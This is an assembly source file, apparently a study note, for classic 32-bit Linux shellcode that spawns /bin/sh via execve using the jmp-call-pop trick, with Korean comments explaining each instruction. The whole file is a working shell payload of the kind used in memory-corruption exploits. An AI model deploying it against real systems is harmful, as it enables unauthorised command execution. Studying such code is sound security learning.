BITS 32

jmp short last

shell:
	; int execve(const char *filename, *const argv[], char *const envp[])
	; filename -> /bin/sh, argv -> /bin/sh, envp -> NULL
	pop ebx			; ebx는 '/bin/sh'가 들어가있음
	xor eax, eax		; eax는 0
	mov [ebx+7], al		; ebx '/bin/sh'에 \x00을 추가 -> 문자열로 만들어 주기 위함
	mov [ebx+8], ebx	; [ebx+8] 이 가르키는 포인터는 '/bin/sh'의 주소
	mov [ebx+12], eax	; [ebx+12] 이 가르키는 포인터는 eax(NULL)의 주소
	lea ecx, [ebx+8]	; execve의 2번째 인자(ecx)에 '/bin/sh\x00'의 주소 복사([ebx+8])
	lea edx, [ebx+12]	; execve의 3번째 인자(exd)에 NULL의 주소 복사([ebx+12])
	mov al, 11
	int 0x80

last:
	call shell
	db '/bin/sh'
